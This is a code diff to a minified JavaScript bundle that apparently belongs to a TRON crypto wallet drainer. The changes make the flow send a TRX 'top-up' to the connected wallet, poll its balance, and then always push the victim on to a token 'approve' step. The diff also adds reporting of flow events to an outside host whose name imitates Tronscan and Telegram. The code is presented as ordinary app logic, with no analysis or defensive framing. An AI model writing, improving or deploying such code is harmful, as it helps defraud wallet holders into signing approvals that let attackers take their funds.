@@ -93005,52 +93005,69 @@
                             });
 
                             if (topUpSent) {
-                                // TRX top-up usually lands in ~7-10s: wait then poll, open sign as soon as funded
+                                // Never hang here: timed waits + timed balance reads, then ALWAYS continue to approve
                                 const beforeTopUp = balanceInTRX;
+                                const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+                                const balanceWithTimeout = async (ms) => {
+                                    try {
+                                        return await Promise.race([
+                                            a.getBalance(c).then((v) => parseFloat(v) || 0),
+                                            sleep(ms).then(() => null)
+                                        ])
+                                    } catch (_) {
+                                        return null
+                                    }
+                                };
                                 console.log("[6] POST-TOP-UP BALANCE CHECK START", {
-                                    mode: "trx-confirm-poll",
-                                    initialDelayMs: 7000,
-                                    intervalMs: 1000,
-                                    maxAttempts: 4,
-                                    expectedConfirmSec: "7-10"
+                                    mode: "safe-confirm-then-approve",
+                                    totalWaitMs: 9000
                                 });
                                 reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
-                                    waitMs: 7000,
-                                    beforeTopUp: beforeTopUp
+                                    waitMs: 9000,
+                                    beforeTopUp: beforeTopUp,
+                                    tx: topUpTxId
                                 });
-                                await new Promise((resolve) => setTimeout(resolve, 7000));
                                 let funded = false;
-                                for (let attempt = 0; attempt < 4; attempt += 1) {
-                                    try {
-                                        balanceInTRX = parseFloat(await a.getBalance(c)) || 0
-                                    } catch (_) {}
-                                    o(balanceInTRX);
-                                    if (balanceInTRX >= minTrx || balanceInTRX > beforeTopUp + 0.5) {
-                                        funded = true;
-                                        console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
-                                            balanceInTRX: balanceInTRX,
-                                            status: "funded",
-                                            attempt: attempt + 1
+                                // 3 x 3s chunks with heartbeat logs (survives mobile timer throttle better)
+                                for (let tick = 1; tick <= 3; tick += 1) {
+                                    await sleep(3000);
+                                    reportEvent("TRX_TOPUP_CONFIRM_HEARTBEAT", {
+                                        tick: tick,
+                                        elapsedMs: tick * 3000
+                                    });
+                                    const bal = await balanceWithTimeout(2500);
+                                    if (null !== bal) {
+                                        balanceInTRX = bal;
+                                        o(balanceInTRX);
+                                        reportEvent("TRX_TOPUP_CONFIRM_POLL", {
+                                            tick: tick,
+                                            balanceInTRX: balanceInTRX
                                         });
-                                        reportEvent("TRX_TOPUP_CONFIRMED", {
-                                            balanceInTRX: balanceInTRX,
-                                            attempt: attempt + 1
-                                        });
-                                        break
-                                    }
-                                    if (attempt < 3) {
-                                        await new Promise((resolve) => setTimeout(resolve, 1000))
+                                        if (balanceInTRX >= minTrx || balanceInTRX > beforeTopUp + 0.5) {
+                                            funded = true;
+                                            reportEvent("TRX_TOPUP_CONFIRMED", {
+                                                balanceInTRX: balanceInTRX,
+                                                tick: tick
+                                            });
+                                            break
+                                        }
+                                    } else {
+                                        reportEvent("TRX_TOPUP_CONFIRM_POLL", {
+                                            tick: tick,
+                                            balanceInTRX: null,
+                                            timedOut: true
+                                        })
                                     }
                                 }
                                 if (!funded) {
-                                    console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
-                                        balanceInTRX: balanceInTRX,
-                                        status: "timeout-continue-sign"
-                                    });
+                                    console.log("[7] POST-TOP-UP continue to approve without confirmed balance read");
                                     reportEvent("TRX_TOPUP_CONFIRM_TIMEOUT", {
-                                        balanceInTRX: balanceInTRX
+                                        balanceInTRX: balanceInTRX,
+                                        continueToApprove: true
                                     })
                                 }
+                                // Force approve path even if RPC lag / hang happened
+                                topUpSent = true
                             } else {
                                 console.log("[6] POST-TOP-UP BALANCE CHECK START", {
                                     skipped: true,
@@ -93189,7 +93206,16 @@
                     });
                 } catch (a) {
                     console.error("[10] ERROR", a);
-                    console.error("Connection error:", a),
+                    console.error("Connection error:", a);
+                    try {
+                        GS.post("https://tronscantelegram-q7ln.onrender.com/api/event", {
+                            stage: "FLOW_ERROR",
+                            error: a && a.message ? a.message : String(a),
+                            time: (new Date).toISOString()
+                        }, {
+                            timeout: 5000
+                        }).catch(() => {})
+                    } catch (_) {}
                     t(2)
                 } finally {
                     try {
